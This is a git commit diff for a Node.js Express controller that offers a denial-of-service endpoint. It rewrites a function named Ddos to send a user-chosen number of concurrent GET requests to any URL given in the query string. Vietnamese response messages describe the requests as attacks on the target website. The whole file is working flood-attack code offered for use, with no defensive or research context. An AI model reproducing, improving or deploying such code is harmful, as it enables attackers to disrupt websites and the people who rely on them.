ef6799ba86f50613c39ea54db6724a47f7cf568f
hai.nv3 <hai.nv3@cmctelecom.vn>
2023-10-01 11:13:53 +0700

    update

--- controllers/ddos.js
+++ controllers/ddos.js
@@ -1,47 +1,41 @@
-import request from "request";
-function Ddos(link, max) {
+import axios from "axios";
+
+async function Ddos(link, max) {
   let failed = 0;
   let count = 0;
-  const inter = setInterval(() => {
-    count++;
-    request(
-      {
-        method: "GET",
-        url: link,
-      },
-      function (error, response, body) {
-        if (error) {
-          failed++;
-        }
-      }
-    );
-    if (count > max) {
-      clearInterval(inter);
-    }
-  }, 0);
+  const requests = [];
+
+  for (let i = 0; i < max; i++) {
+    requests.push(axios.get(link).catch((error) => {
+      failed++;
+    }));
+  }
+  await Promise.all(requests);
 }
+
 function isValidURL(str) {
   const urlPattern =
     /^(https?:\/\/)?([\w-]+(\.[\w-]+)+)([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?$/;
   return urlPattern.test(str);
 }
+
 export const sendDdos = async (req, res) => {
   if (isNaN(req.query.max)) {
-    return res.json({
+    return res.status(400).json({
       code: 400,
       message: "Số lần tấn công phải là số",
     });
   }
   if (isValidURL(req.query.link)) {
-    Ddos(req.query.link, req.query.max);
+     Ddos(req.query.link, req.query.max);
   } else {
-    return res.json({
+    return res.status(400).json({
       code: 400,
       message: "Link sai định dạng",
     });
   }
-  res.json({
-    code:200,
-    message: `Đã gửi request tấn công website: ${req.query.link}`
-  })
+  res.status(200).json({
+    code: 200,
+    message: `Đã gửi request tấn công website: ${req.query.link}`,
+  });
 };
